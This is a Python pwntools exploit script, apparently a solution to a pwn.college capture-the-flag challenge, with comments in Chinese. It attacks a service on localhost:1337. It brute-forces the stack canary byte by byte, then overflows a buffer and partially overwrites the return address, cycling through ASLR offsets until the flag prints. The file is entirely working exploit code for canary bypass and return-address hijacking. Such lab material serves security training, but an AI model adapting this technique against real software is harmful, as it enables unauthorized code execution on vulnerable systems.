import itertools
import sys

from pwn import *

context.log_level = "error"


def get_canary():
    canary = b"\x00"

    for i in range(7):
        for guess in range(256):
            p = remote("localhost", 1337)
            try:
                # buf var_80h = 128
                # 构造：120 字节垃圾数据 + 已知的 canary 部分 + 当前猜测的 1 字节
                payload = b"A" * 120 + canary + bytes([guess])

                p.sendlineafter(b"Payload size:", str(len(payload)).encode())
                p.sendafter(b"bytes)!\n", payload)

                result = p.recvall(timeout=0.1)

                if b"stack smashing detected" not in result:
                    canary += bytes([guess])
                    print(
                        f"[+] 找到第 {i + 2} 字节: {hex(guess)} -> 当前 Canary: {canary.hex()}"
                    )
                    p.close()
                    break
            except EOFError:
                pass
            finally:
                p.close()
    return canary


def pwn_it(canary):
    for attempts in itertools.count():
        f = attempts % 16

        sys.stdout.write(f"\r[->] attempts: {attempts}")
        sys.stdout.flush()

        p = remote("localhost", 1337)
        try:
            # 120 字节填充 + 8 字节 Canary + 8 字节 saved RBP + 2 字节的部分返回地址覆盖
            # target address -> 0x2289
            payload = b"A" * 120 + canary + b"B" * 8 + p16(0x9db + 0x1000 * f)

            p.sendlineafter(b"Payload size:", str(len(payload)).encode())
            p.sendafter(b"bytes)!\n", payload)

            result = p.recvall(timeout=0.2)

            if b"pwn.college{" in result:
                print(result.decode())
                p.close()
                break
        except EOFError:
            pass
        finally:
            p.close()


if __name__ == "__main__":
    canary = get_canary()

    if len(canary) == 8:
        pwn_it(canary)
